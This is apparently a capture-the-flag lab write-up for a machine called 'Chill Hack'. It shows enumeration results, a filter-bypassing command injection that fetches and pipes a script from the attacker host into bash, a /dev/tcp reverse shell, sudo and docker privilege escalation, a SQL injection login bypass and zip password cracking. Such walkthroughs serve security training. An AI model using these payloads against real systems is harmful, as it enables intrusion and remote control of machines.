# Chill Hack
```
EXPORT IP=10.10.163.188
```

# PART.1 Shell Connection && USER Escalation
## SCAN
```
21 FTP
22 SSH
80 HTTP
```

## Web Enumeration
```
/contact.php (Status: 200)
/images (Status: 301)
/css (Status: 301)
/style.css (Status: 200)
/js (Status: 301)
/fonts (Status: 301)
/secret (Status: 301)
```

## bypass string (/secrect)
```
[OS Command Bypass Technic]
https://medium.com/picus-security/how-to-bypass-wafs-for-os-command-injection-2c5dd4e6a52b

[shell.sh]
bash -i >& /dev/tcp/10.9.26.67/4444 0>&1

[OS Command Bypass Technic && REVERSE SHELL PAYLOAD]
curl 10.9.26.67:8000/shell.sh |ba\sh
```

## Stabilize Shell
```
python3 -c "import pty; pty.spawn('/bin/bash)"
CTRL ^Z
stty raw -echo;fg
stty rows 29 columns 126
export TERM=screen
```

## USER FLAG
```
1. sudo -l
2. sudo -u apaar /home/apaar/.helpline.sh
3. input the "/bin/bash"
cat local.txt ----> user.txt 1
```

# PART.2 Privilige Escalation

## SSH Turneling
```
sudo ssh -L 8888:127.0.0.1:9001 -i apaar_rsa apaar@EXPORT_IP
```

## SQL injecting
```
1. access 8888 on local machine
2. ' or 1=1 #

3. Image Download && Brute FOrcing
fcrackzip -u -D -p '{rockyou_path}' /backup.zip

4. anurodh:!d0ntKn0wmYp@ssw0rd

```

## Docker Root
```
GTFObins : docker 'sudo'
```